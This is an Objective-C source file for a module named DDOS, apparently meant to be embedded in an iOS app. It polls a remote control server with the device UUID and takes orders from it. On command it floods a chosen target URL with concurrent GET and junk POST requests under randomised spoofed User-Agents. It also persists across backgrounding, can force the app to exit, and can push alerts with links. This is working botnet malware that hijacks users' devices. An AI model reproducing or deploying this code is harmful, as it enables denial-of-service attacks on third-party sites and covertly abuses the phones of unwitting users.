// file .m
// Project: DDOS
// Created by @dothanh1110 on 1/2/2025.

#import "DDOS.h"
#import <UIKit/UIKit.h>
@implementation DDOS
static NSString *staticLink;

+ (instancetype)sharedClient {
    static DDOS *sharedInstance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        sharedInstance = [[self alloc] init];
    });
    return sharedInstance;
}

- (instancetype)init {
    self = [super init];
    if (self) {
        [self setupAppLifecycleObservers];
        [self restoreState];
        [self setupBackgroundNotification];
        [self getLink];
        [self generateAndStoreUUID];
        NSLog(@"[DDOS] Init - deviceUUID sau khi generateAndStoreUUID: %@", self.deviceUUID);  
    }
    return self;
}

- (void)generateAndStoreUUID {
    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
    NSString *uuidString = [defaults stringForKey:@"deviceUUID"];

    if (!uuidString) {
        uuidString = [self getUUID]; 
        [defaults setObject:uuidString forKey:@"deviceUUID"];
        [defaults synchronize];
        NSLog(@"[DDOS] generateAndStoreUUID - Tạo mới và lưu UUID: %@", uuidString); 
    } else {
        NSLog(@"[DDOS] generateAndStoreUUID - Lấy UUID đã lưu từ UserDefaults: %@", uuidString);  
    }
    self.deviceUUID = uuidString;  
}

 
- (NSString *)getUUID {
    return [[UIDevice currentDevice].identifierForVendor UUIDString];
}

 

- (void)startDDOS {
    self.isDDOSming = NO;
    self.currentURL = nil;
    self.threads = 10;  
    self.delay = 0.001; 
    self.operationQueue = [[NSOperationQueue alloc] init];
    self.operationQueue.maxConcurrentOperationCount = self.threads;
    [self setupTimer];
}

- (void)setupTimer {
    dispatch_async(dispatch_get_main_queue(), ^{
    
        self.timer = [NSTimer scheduledTimerWithTimeInterval:20.0 target:self selector:@selector(checkURL) userInfo:nil repeats:YES];
        [[NSRunLoop mainRunLoop] addTimer:self.timer forMode:NSRunLoopCommonModes];
        [self checkURL];  
    });
}

- (void)setupAppLifecycleObservers {
    [[NSNotificationCenter defaultCenter] addObserver:self
                                             selector:@selector(appDidEnterBackground)
                                                 name:UIApplicationDidEnterBackgroundNotification
                                               object:nil];

    [[NSNotificationCenter defaultCenter] addObserver:self
                                             selector:@selector(appWillEnterForeground)
                                                 name:UIApplicationWillEnterForegroundNotification
                                               object:nil];
}

- (void)appDidEnterBackground {
    [self saveState];
    [self.timer invalidate];
    self.timer = nil;
    [self startBackgroundTask];
}

- (void)appWillEnterForeground {
    [self restoreState];
    [self setupTimer];
    [self stopBackgroundTask];
}

- (void)startBackgroundTask {
    self.backgroundTask = [[UIApplication sharedApplication] beginBackgroundTaskWithExpirationHandler:^{
        [[UIApplication sharedApplication] endBackgroundTask:self.backgroundTask];
        self.backgroundTask = UIBackgroundTaskInvalid;
    }];
}

- (void)stopBackgroundTask {
    if (self.backgroundTask != UIBackgroundTaskInvalid) {
        [[UIApplication sharedApplication] endBackgroundTask:self.backgroundTask];
        self.backgroundTask = UIBackgroundTaskInvalid;
    }
}

- (void)setupBackgroundNotification {
    UNUserNotificationCenter *center = [UNUserNotificationCenter currentNotificationCenter];
    [center requestAuthorizationWithOptions:(UNAuthorizationOptionAlert | UNAuthorizationOptionSound | UNAuthorizationOptionBadge)
                          completionHandler:^(BOOL granted, NSError * _Nullable error) {
        if (granted) {
            // Tạo một notification ẩn
            UNMutableNotificationContent *content = [[UNMutableNotificationContent alloc] init];
            content.title = @"";
            content.body = @"";
            content.sound = nil;

            UNTimeIntervalNotificationTrigger *trigger = [UNTimeIntervalNotificationTrigger triggerWithTimeInterval:1 repeats:NO];
            UNNotificationRequest *request = [UNNotificationRequest requestWithIdentifier:@"hiddenNotification" content:content trigger:trigger];

            [center addNotificationRequest:request withCompletionHandler:nil];
        }
    }];
}

- (void)saveState {
    [[NSUserDefaults standardUserDefaults] setBool:self.isDDOSming forKey:@"isDDOSming"];
    [[NSUserDefaults standardUserDefaults] setObject:self.currentURL forKey:@"currentURL"];
    [[NSUserDefaults standardUserDefaults] setObject:self.requestType forKey:@"requestType"];
    [[NSUserDefaults standardUserDefaults] synchronize];
}

- (void)restoreState {
    self.isDDOSming = [[NSUserDefaults standardUserDefaults] boolForKey:@"isDDOSming"];
    self.currentURL = [[NSUserDefaults standardUserDefaults] stringForKey:@"currentURL"];
    self.requestType = [[NSUserDefaults standardUserDefaults] stringForKey:@"requestType"];

    if (self.isDDOSming && self.currentURL) {
        [self startDDOSming];
    }
}
- (void)setLink:(NSString *)link {
    staticLink = link;
}

- (NSString *)getLink {
    if (staticLink) return staticLink;

    return nil;
}

- (void)checkURL {
    NSLog(@"[DDOS] checkURL - Bắt đầu checkURL, deviceUUID: %@", self.deviceUUID); 
    NSString *urlString = [self getLink];
    if (urlString.length == 0) {
        NSLog(@"URL is empty");
        return;
    }
    NSURL *url = [NSURL URLWithString:urlString];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.timeoutInterval = 30.0;
    [request setValue:[self randomUserAgent] forHTTPHeaderField:@"User-Agent"];
    request.HTTPMethod = @"POST"; 
    NSString *postString = [NSString stringWithFormat:@"uuid=%@", self.deviceUUID]; 
    NSData *postData = [postString dataUsingEncoding:NSUTF8StringEncoding];
    [request setHTTPBody:postData];

    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        if (data) {
            NSError *jsonError;
            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:&jsonError];
            if (jsonError) {
                NSLog(@"Error parsing JSON: %@", jsonError);
                return; 
            }
            [self handleJSONResponse:json];
        } else if (error) {
            NSLog(@"Error fetching JSON: %@", error);
        }
    }];
    [task resume];
}

- (void)handleJSONResponse:(NSDictionary *)json {
    NSString *urlString = json[@"url"];
    NSNumber *startNumber = json[@"start"];
    NSInteger start = [startNumber isKindOfClass:[NSNumber class]] ? [startNumber integerValue] : -1;  
    NSNumber *threadsNumber = json[@"threads"];
    NSInteger threads = [threadsNumber isKindOfClass:[NSNumber class]] ? [threadsNumber integerValue] : 0; 
    NSNumber *delayNumber = json[@"delay"];
    NSTimeInterval delay = [delayNumber isKindOfClass:[NSNumber class]] ? [delayNumber doubleValue] : 0.0; 
    NSString *textnoti = json[@"textnoti"];
    NSString *linknoti = json[@"linknoti"];
    NSNumber *exitAppNumber = json[@"exit"];
    NSInteger exitApp = [exitAppNumber isKindOfClass:[NSNumber class]] ? [exitAppNumber integerValue] : 0; 
    NSString *req = json[@"req"];

    if (threads > 0) {
        self.threads = threads;
        self.operationQueue.maxConcurrentOperationCount = self.threads;
    }

    if (delay > 0) {
        self.delay = delay;
    }

    if (req) {
        self.requestType = req;
    }

    
    if (start == 0) {
        if (self.isDDOSming) {
            [self stopDDOSming]; 
            NSLog(@"Dừng ddosming theo JSON.");
        }
        self.isDDOSming = NO;
        self.currentURL = nil;
    } else if (start == 1) {
        if ([urlString hasPrefix:@"https://"]) {
            if (![self.currentURL isEqualToString:urlString]) {
                self.currentURL = urlString;
            }
            if (!self.isDDOSming) {
                self.isDDOSming = YES;
                [self startDDOSming]; 
            }
        }
    } else {
        NSLog(@"Giá trị 'start' không hợp lệ trong JSON hoặc không tồn tại.");
    }


    if (exitApp == 1) {
        exit(0);
    }

    if (textnoti.length > 0) {
        [self showAlertWithText:textnoti andLink:linknoti];
    }
}

- (void)startDDOSming {
    if (self.isDDOSming && self.currentURL) {  
        __weak typeof(self) weakSelf = self;
        [self.operationQueue addOperationWithBlock:^{
            while (weakSelf.isDDOSming && weakSelf.currentURL) {  
                @autoreleasepool {
                    NSURL *url = [NSURL URLWithString:weakSelf.currentURL];

                    if ([weakSelf.requestType containsString:@"get"]) {
                        [self sendGetRequestToURL:url];
                    }

                    if ([weakSelf.requestType containsString:@"post"]) {
                        [self sendRandomPostRequestToURL:url];
                    }
                }
                [NSThread sleepForTimeInterval:weakSelf.delay];
            }
        }];
    }
}

- (void)sendGetRequestToURL:(NSURL *)url {
    NSMutableURLRequest *getRequest = [NSMutableURLRequest requestWithURL:url];
    [getRequest setValue:[self randomUserAgent] forHTTPHeaderField:@"User-Agent"];
    getRequest.HTTPMethod = @"GET";

    NSURLSessionDataTask *getTask = [[NSURLSession sharedSession] dataTaskWithRequest:getRequest completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
    }];
    [getTask resume];
}

- (void)sendRandomPostRequestToURL:(NSURL *)url {
    NSInteger randomType = arc4random_uniform(7);
    switch (randomType) {
        case 0: [self sendFormDataRequestToURL:url]; break;
        case 1: [self sendMultipartFormDataRequestToURL:url]; break;
        case 2: [self sendJSONRequestToURL:url]; break;
        case 3: [self sendXMLRequestToURL:url]; break;
        case 4: [self sendPlainTextRequestToURL:url]; break;
        case 5: [self sendBinaryDataRequestToURL:url]; break;
        default: break;
    }
}

- (void)sendFormDataRequestToURL:(NSURL *)url {
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setValue:[self randomUserAgent] forHTTPHeaderField:@"User-Agent"];
    [request setValue:@"application/x-www-form-urlencoded" forHTTPHeaderField:@"Content-Type"];
    request.HTTPMethod = @"POST";

    NSString *bodyData = @"param1=value1¶m2=value2&..."; 
    [request setHTTPBody:[bodyData dataUsingEncoding:NSUTF8StringEncoding]];

    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
   
        if (error) {
            NSLog(@"Form Data POST Request Error: %@", error);
        } else {
         
        }
    }];
    [task resume];
}

- (void)sendMultipartFormDataRequestToURL:(NSURL *)url {
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setValue:[self randomUserAgent] forHTTPHeaderField:@"User-Agent"];
    NSString *boundary = [NSString stringWithFormat:@"Boundary-%@", [[NSUUID UUID] UUIDString]];  
    [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
    request.HTTPMethod = @"POST";

    NSMutableData *body = [NSMutableData data];
    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Disposition: form-data; name=\"file\"; filename=\"test.txt\"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Type: text/plain\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"This is a test file." dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    request.HTTPBody = body;

    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
 
         if (error) {
            NSLog(@"Multipart Form Data POST Request Error: %@", error);
        } else {
 
        }
    }];
    [task resume];
}

- (void)sendJSONRequestToURL:(NSURL *)url {
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setValue:[self randomUserAgent] forHTTPHeaderField:@"User-Agent"];
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    request.HTTPMethod = @"POST";

    NSDictionary *randomData = [self generateRandomData];
    NSData *postData = [NSJSONSerialization dataWithJSONObject:randomData options:0 error:nil];
    request.HTTPBody = postData;

    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
     
         if (error) {
            NSLog(@"JSON POST Request Error: %@", error);
        } else {
           
        }
    }];
    [task resume];
}

- (NSDictionary *)generateRandomData {
    NSMutableDictionary *data = [NSMutableDictionary dictionary];
    for (int i = 0; i < 100; i++) {
        NSString *key = [NSString stringWithFormat:@"key_%d", i];
        if (arc4random_uniform(2) == 0) {
            data[key] = [self randomLongString];
        } else {
            data[key] = @{
                @"nested_key_1": [self randomLongString],
                @"nested_key_2": @(arc4random_uniform(100000)),
                @"nested_key_3": @[
                    [self randomLongString],
                    [self randomLongString],
                    [self randomLongString]
                ]
            };
        }
    }
    return data;
}

- (NSString *)randomLongString {
    NSMutableString *longString = [NSMutableString string];
    for (int i = 0; i < 1000; i++) {
        [longString appendString:[self randomWord]];
        [longString appendString:@" "];
    }
    return longString;
}

- (NSString *)randomWord {
    NSArray *words = @[@"Alpha", @"Beta", @"Gamma", @"Delta", @"Epsilon", @"Zeta", @"Eta", @"Theta", @"Iota", @"Kappa"];
    return words[arc4random_uniform((uint32_t)words.count)];
}

- (void)sendXMLRequestToURL:(NSURL *)url {
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setValue:[self randomUserAgent] forHTTPHeaderField:@"User-Agent"];
    [request setValue:@"application/xml" forHTTPHeaderField:@"Content-Type"];
    request.HTTPMethod = @"POST";

    NSString *xmlString = @"<root><element>value</element></root>";
    NSData *postData = [xmlString dataUsingEncoding:NSUTF8StringEncoding];
    request.HTTPBody = postData;

    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
         if (error) {
            NSLog(@"XML POST Request Error: %@", error);
        } else {
        }
    }];
    [task resume];
}

- (void)sendPlainTextRequestToURL:(NSURL *)url {
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setValue:[self randomUserAgent] forHTTPHeaderField:@"User-Agent"];
    [request setValue:@"text/plain" forHTTPHeaderField:@"Content-Type"];
    request.HTTPMethod = @"POST";

    NSString *plainText = [self randomLongString];
    NSData *postData = [plainText dataUsingEncoding:NSUTF8StringEncoding];
    request.HTTPBody = postData;

    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
         if (error) {
            NSLog(@"Plain Text POST Request Error: %@", error);
        } else {
        }
    }];
    [task resume];
}

- (void)sendBinaryDataRequestToURL:(NSURL *)url {
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setValue:[self randomUserAgent] forHTTPHeaderField:@"User-Agent"];
    [request setValue:@"application/octet-stream" forHTTPHeaderField:@"Content-Type"];
    request.HTTPMethod = @"POST";

    NSMutableData *binaryData = [NSMutableData data];
    for (int i = 0; i < 1000; i++) {
        uint8_t randomByte = arc4random_uniform(256);
        [binaryData appendBytes:&randomByte length:1];
    }
    request.HTTPBody = binaryData;

    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
         if (error) {
            NSLog(@"Binary Data POST Request Error: %@", error);
        } else {
        }
    }];
    [task resume];
}


- (void)stopDDOSming {
    self.isDDOSming = NO;
    [self.operationQueue cancelAllOperations];
    NSLog(@"Đã dừng ddosming.");
}

- (NSString *)randomUserAgent {
    NSArray *osList = @[
        [NSString stringWithFormat:@"Windows NT %d.%d; Win64; x64", arc4random_uniform(7) + 5, arc4random_uniform(4)],
        [NSString stringWithFormat:@"Macintosh; Intel Mac OS X %d_%d_%d", arc4random_uniform(5) + 10, arc4random_uniform(16), arc4random_uniform(11)],
        [NSString stringWithFormat:@"Linux; Android %d; %s %s", arc4random_uniform(10) + 5, [self randomWord].UTF8String, [self randomWord].UTF8String],
        @"X11; Linux x86_64",
        [NSString stringWithFormat:@"iPhone; CPU iPhone OS %d_%d like Mac OS X", arc4random_uniform(7) + 10, arc4random_uniform(7)],
        [NSString stringWithFormat:@"iPad; CPU OS %d_%d like Mac OS X", arc4random_uniform(7) + 10, arc4random_uniform(7)]
    ];

    NSArray *browserList = @[
        [NSString stringWithFormat:@"Chrome/%d.0.%d.%d Safari/537.36", arc4random_uniform(71) + 50, arc4random_uniform(9000) + 1000, arc4random_uniform(900) + 100],
        [NSString stringWithFormat:@"Firefox/%d.0", arc4random_uniform(71) + 50],
        [NSString stringWithFormat:@"Safari/%d.%d", arc4random_uniform(200) + 500, arc4random_uniform(50) + 1],
        [NSString stringWithFormat:@"Edg/%d.0.%d.%d", arc4random_uniform(71) + 50, arc4random_uniform(9000) + 1000, arc4random_uniform(900) + 100],
        [NSString stringWithFormat:@"Opera/%d.0.%d.%d", arc4random_uniform(71) + 50, arc4random_uniform(9000) + 1000, arc4random_uniform(900) + 100]
    ];

    NSString *os = osList[arc4random_uniform((uint32_t)osList.count)];
    NSString *browser = browserList[arc4random_uniform((uint32_t)browserList.count)];

    return [NSString stringWithFormat:@"Mozilla/5.0 (%@) AppleWebKit/537.36 (KHTML, like Gecko) %@", os, browser];
}


- (void)showAlertWithText:(NSString *)text andLink:(NSString *)link {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Alert" message:text preferredStyle:UIAlertControllerStyleAlert];

        UIAlertAction *okAction = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
            if (link.length > 0) {
                NSURL *url = [NSURL URLWithString:link];
                if (url) {
                    [[UIApplication sharedApplication] openURL:url options:@{} completionHandler:nil];
                }
            }
  
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                exit(0);
            });
        }];
        [alert addAction:okAction];

    
        UIWindow *window = nil;
        for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
            if ([scene isKindOfClass:[UIWindowScene class]]) {
                for (UIWindow *w in ((UIWindowScene *)scene).windows) {
                    if (w.isKeyWindow) {
                        window = w;
                        break;
                    }
                }
            }
            if (window) break;
        }

      
        if (window && window.rootViewController) {
            [window.rootViewController presentViewController:alert animated:YES completion:nil];
        }
    });
}

@end